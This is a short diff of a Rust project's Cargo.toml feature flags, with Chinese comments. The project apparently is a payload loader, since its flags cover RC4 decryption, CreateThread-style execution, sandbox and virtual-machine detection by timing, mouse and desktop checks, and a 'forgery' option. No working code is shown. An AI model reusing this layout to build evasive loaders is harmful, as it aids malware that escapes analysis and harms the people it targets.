@@ -33,16 +33,19 @@ rand = "0.8.5"
 
 [features]
 # 解密算法特性开关
-decrypt_rc4 = []
+decrypt = []
+decrypt_rc4 = ["decrypt"]
 
 # 注入/执行方式
 run_create_thread = []
 
 # 虚拟机/沙箱检测特性
-vm_check_tick = []
-vm_check_mouse = []
-vm_check_desktop_files = []
-no_sandbox = []
+sandbox = []
+vm_check_tick = ["sandbox"]
+vm_check_mouse = ["sandbox"]
+vm_check_desktop_files = ["sandbox"]
+
+with_forgery = []
 
 
 [profile.release]
